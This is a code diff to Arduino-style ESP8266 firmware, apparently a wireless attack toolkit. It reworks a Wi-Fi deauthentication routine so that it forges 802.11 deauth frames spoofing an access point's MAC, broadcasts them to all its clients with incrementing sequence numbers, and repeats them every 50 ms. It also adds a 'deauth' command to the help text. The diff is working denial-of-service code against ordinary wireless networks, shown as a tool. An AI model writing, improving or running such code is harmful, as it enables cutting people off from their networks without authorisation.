@@ -53,7 +53,7 @@ uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
 
 uint8_t d_packet[26] = {
     /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
-    /*  2 - 3  */ 0x3A, 0x01,                         // duration (SDK takes care of that)
+    /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
     /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // reciever (target)
     /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (ap)
     /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (ap)
@@ -319,6 +319,7 @@ void handleCommand(char **args, int index){
     Serial.println("pcap enable");
     Serial.println("pcap disable");
     Serial.println("network-scan");
+    Serial.println("deauth [pow/disable] [ap-mac]");
   }else if(strcmp(args[0], "esptap-help") == 0){
     Serial.println("ESPTAP help:");
     Serial.println("esptap connected");
@@ -706,31 +707,24 @@ void de_parseMac(const char* macStr, uint8_t* mac) {
     }
 }
 
-void deauth_network(uint8_t channel){
-  Serial.print("1");
+uint16_t sq = 0;
+
+void deauth_network(){
   uint16_t packsize = sizeof(d_packet);
   char *macstr = parseMac(targ);
 
   uint8_t reason = 1;
 
-  memcpy(&d_packet[4], targ, 6);
-  memcpy(&d_packet[10], broadcast, 6);
+  memcpy(&d_packet[4], broadcast, 6);
+  memcpy(&d_packet[10], targ, 6);
   memcpy(&d_packet[16], targ, 6);
   d_packet[24] = reason;
+  d_packet[25] = 0x00;
   d_packet[0] = 0xc0;
+  d_packet[22] = sq % 0xFF;
+  d_packet[23] = sq / 0xFF;
   nextChannel();
 
-  Serial.print("2");
-  Serial.print("3");
-
-  for (int i = 0; i < sizeof(d_packet); i++) {
-      Serial.print("0x");
-      Serial.print((unsigned long) &d_packet[i], HEX);
-      Serial.print(": ");
-      Serial.print(d_packet[i], HEX);
-      Serial.print(" ");
-  }
-  Serial.println();
 
   int send = wifi_send_pkt_freedom(d_packet, 26, 0);
   if(send == 0){
@@ -749,6 +743,9 @@ void deauth_network(uint8_t channel){
     Serial.print("ERR -> ");
     Serial.println(send2);
   }
+
+  sq += 0x10;
+  free(macstr);
 }
 
 void loop() {
@@ -782,7 +779,8 @@ void loop() {
     }
   }
   if(deauthing){
-    deauth_network(6);
+    deauth_network();
+    delay(50);
   }
   if(spamming_beacons){
     currentTime = millis();
